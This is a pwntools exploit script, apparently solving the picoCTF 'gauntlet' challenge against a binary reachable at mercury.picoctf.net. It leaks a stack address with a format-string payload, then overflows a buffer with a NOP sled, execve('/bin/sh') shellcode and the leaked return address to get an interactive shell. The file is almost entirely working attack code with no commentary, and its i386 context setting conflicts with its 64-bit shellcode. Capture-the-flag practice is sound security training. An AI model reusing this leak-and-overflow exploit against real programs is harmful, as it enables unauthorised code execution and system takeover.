#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from pwnlib.util.cyclic import cyclic_gen

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './gauntlet'
BIN = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        if args.REMOTE:
            return remote('mercury.picoctf.net', 59636)
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
io = start(argv=[shellcode])

# payload = ''.join('{}:%{}$p,'.format(i, i) for i in range(100))
payload = '%6$p'
io.sendline(payload)
output = io.recvline()
leak = int(output.strip(), 0) - 0x140
# leak = 0x0
log.info('Got leak: {}'.format(hex(leak)))
# log.info("Got output:\n{}".format('\n'.join(output.decode('ascii').split(','))))
generator = cyclic_gen()
payload = b'\x90'*40 + shellcode
io.sendline(payload + b'\x90'*(120-len(payload)) + p64(leak))

io.interactive()

